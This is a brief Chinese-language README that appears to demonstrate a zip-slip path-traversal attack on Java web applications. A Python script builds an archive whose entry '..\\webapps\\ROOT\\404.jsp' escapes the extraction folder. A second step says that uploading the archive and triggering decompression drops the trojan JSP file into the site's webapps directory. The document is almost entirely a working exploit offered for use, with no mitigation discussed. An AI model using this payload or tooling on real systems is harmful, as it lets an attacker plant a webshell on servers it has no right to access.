# Java-Compressed-file-security java web 压缩文件 安全 漏洞

## 0x01 制作目录穿越-恶意压缩文件

代码：

```
#coding=utf-8

import zipfile  
import sys

if __name__ == "__main__":  
    try:
        with open("404.jsp", "r") as f:
            binary = f.read()
            zipFile = zipfile.ZipFile("test.zip", "a", zipfile.ZIP_DEFLATED)
            info = zipfile.ZipInfo("test.zip")
            zipFile.writestr("..\\webapps\\ROOT\\404.jsp", binary)
            zipFile.close()
    except IOError as e:
        raise e

```

## 0x02 文件上传，点击解压缩，木马文件解压到网站webapps目录



